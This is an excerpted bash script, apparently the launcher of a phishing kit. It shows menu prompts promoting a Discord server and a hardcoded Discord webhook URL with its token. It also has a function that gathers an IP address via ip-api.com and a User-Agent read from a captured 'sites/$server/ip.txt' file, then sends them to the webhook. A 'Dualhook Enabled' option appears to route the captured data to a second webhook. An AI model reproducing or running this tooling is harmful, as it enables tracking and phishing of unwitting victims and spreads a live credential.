...
menu() {
    ...
    read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Subscribed to my channel? y/n: \e[0m\en' option
    ...
    if [[ $option == y || $option == Y ]]; then
        ...
        printf "\e[1;93mYou will now be redirected!\e[1;93m"
...
menu2() {
    read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Joined our Discord? y/n: \e[0m\en' option
    ...
    if [[ $option == y || $option == Y ]]; then
        ...
        printf "\e[1;93mYou will now be redirected!\e[1;93m"
        xdg-open "https://discord.com/invite/EQ2aWrXtqK"
        sleep 1
        exit
    fi
}
...
send_to_discord() {
    # Discord webhook URL
    webhook_url="https://discord.com/api/webhooks/1219341776620617738/XR_wVP7ZCHdrggDvxaeSA2mkHpsedkpFQCUktjJjTKU5NHrkj6210GjKBP-6Qad4HvQ1"
...
# Function to capture IP information and send it to Discord
catch_ip_and_send_to_discord() {
    # Extracting IP information using IP-API
    ip=$(curl -s "http://ip-api.com/json/" | grep -o '"query":"[^"]*' | cut -d ":" -f2 | tr -d '"' | tr -d '\r')
    ...
    message+="**Current Time:** $(date +"%T")\n"

    # Check if the file exists before attempting to read user-agent
    if [[ -f "sites/$server/ip.txt" ]]; then
        ua=$(grep 'User-Agent:' "sites/$server/ip.txt" | cut -d '"' -f2)
        if [[ -n "$ua" ]]; then
            message+="**User-Agent:** $ua\n"
        else
            message+="**User-Agent:** *Not Available*\n"
        fi
    else
        message+="**User-Agent:** *Not Available*\n"
    fi
...
start2() {
    ...
    option_server="${option_server:-${default_option_server}}"
    if [[ $option_server == "01" || $option_server == "1" ]]; then
        printf "\e[1;92m[\e[0m*\e[1;92m] Dualhook Enabled\e[0m\n"
